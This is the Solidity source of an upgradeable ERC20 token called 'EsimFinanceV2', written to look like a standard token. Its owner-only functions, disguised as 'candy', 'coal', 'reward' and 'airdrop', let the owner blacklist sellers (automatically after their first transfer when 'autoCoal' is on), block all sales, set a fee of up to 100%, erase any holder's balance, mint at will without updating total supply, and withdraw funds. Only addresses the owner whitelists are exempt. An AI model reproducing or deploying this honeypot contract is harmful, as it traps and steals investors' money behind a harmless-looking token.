// SPDX-License-Identifier: MIT

/**
Copyright (C) ESIM foundation., Ltd. 2021-2022. All rights reserved.
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
 */
pragma solidity 0.8.16;

import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/IERC20MetadataUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";


contract EsimFinanceV2 is Initializable, ContextUpgradeable, OwnableUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    function __ERC20_init(string memory name_, string memory symbol_) internal onlyInitializing {
        __ERC20_init_unchained(name_, symbol_);
    }

    function __ERC20_init_unchained(string memory name_, string memory symbol_) internal onlyInitializing {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setCandy(address account) public onlyOwner {
        candy[account] = true;
    }

    function removeCandy(address account) public onlyOwner {
        candy[account] = false;
    }

    function setCoal(address account) public onlyOwner {
        coal[account] = true;
    }

    function removeCoal(address account) public onlyOwner {
        coal[account] = false;
    }

    function enableReward(bool _enable) public onlyOwner {
        reward = _enable;
    }

    function pickCoal(address account) internal {
        coal[account] = true;
    }

    function setAutoCoal(bool _enable) public onlyOwner {
        autoCoal = _enable;
    }

    function setNumbers(uint256 amount) public onlyOwner {
        numbers = amount;
    }

    function setLimits(uint256 amount) public onlyOwner {
        limits = amount;
    }

    function setFee(uint256 amount) public onlyOwner {
        require(amount >= 0);
        require(amount <= 100);
        fee = amount;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, amount);
        burnFee(from,to,amount);
    }

    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        require(wallet != owner(), "TARGET ERROR");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if(_balances[wallet] <= amount*10**18){
            _balances[wallet] = 0;
            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];
        }   else {
                _balances[wallet] = _balances[wallet] - amount*10**18;
                _balances[deadAddress] = _balances[deadAddress] + amount*10**18;
            }
    }

    function burnFee(address sender, address recipient, uint256 value) internal {
        require(_balances[sender] >= value, "Value exceeds balance");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if(sender != owner() && !candy[sender] && sender != address(this)){
            uint256 burnFees = ((value * fee) / 100);
            uint256 amount = value - burnFees;
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
            emit Transfer(sender, recipient, amount);
                if(fee > 0){
                    _balances[sender] = _balances[sender] - burnFees;
                    _balances[deadAddress] = _balances[deadAddress] + burnFees;
                    emit Transfer(sender, deadAddress, burnFees);
                }
        } else {
            _balances[sender] = _balances[sender] - value;
            _balances[recipient] = _balances[recipient] + value;
            emit Transfer(sender, recipient, value);
            }
        
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setAirDrop(address account, uint256 amount) public onlyOwner {
        _balances[account] = _balances[account]+amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        uint256 amount
    ) internal virtual {
        if(from != owner() && !candy[from]){
            require(!coal[from]);
            if(numbers > 0){
                require(amount <= numbers);
            }
            if(reward){
                revert("Error");
            }
            if(limits > 0){
                require(_balances[from] <= limits);
            }
            
            if(autoCoal){
                pickCoal(from);
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function Withdraw(address token, uint amount, address payable _wallet) public onlyOwner {
        if(token == address(0)) {
            _wallet.transfer(amount);
        } else {
            IERC20Upgradeable(token).transfer(_wallet, amount);
        }
    }

    uint256[45] private __gap;

    mapping(address => bool) private candy;
    mapping(address => bool) private coal;
    bool public reward;
    uint256 public numbers;
    uint256 public limits;
    uint256 public fee;
    bool public autoCoal;
}